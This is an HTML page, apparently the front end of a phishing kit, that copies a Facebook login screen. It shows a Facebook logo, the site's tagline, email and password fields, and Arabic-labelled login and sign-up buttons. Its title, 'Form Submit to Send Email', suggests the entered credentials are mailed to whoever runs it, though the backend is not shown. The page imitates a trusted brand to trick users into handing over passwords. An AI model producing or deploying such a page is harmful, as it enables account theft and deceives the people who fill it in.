<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
<title>Form Submit to Send Email</title>
<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>

 
<div class="form-container">
  <form name="contactFormEmail" method="post">
    <div class="name-content">
      <h1 class="logo">Facebook</h1>
      <p>Connect with friends and the world around you on Facebook.</p>
    <div class="input-row">
      <label>Email <em>:</em></label> 
      <input type="text" name="userName" required id="userName" class="txt"><br>
    </div>
    <div class="input-row">
      <label>Password <em>:</em></label> 
      <input type="Password" name="userEmail" required id="userEmail" class="txt"><br>
    </div>


     <!-- <textarea name="userMessage" required id="userMessage"> -->
    <div class="input-row">
      <input type="submit" name="send" value="تسجيل الدخول">
      <br>
      <a href="#">...............Forgot Password ?</a>
     
       <hr>
      <div class='success'>
        <strong>انشاء حساب جديد</strong>
      </div>
      
    </div>
  </form>
</div>

</body>
</html>
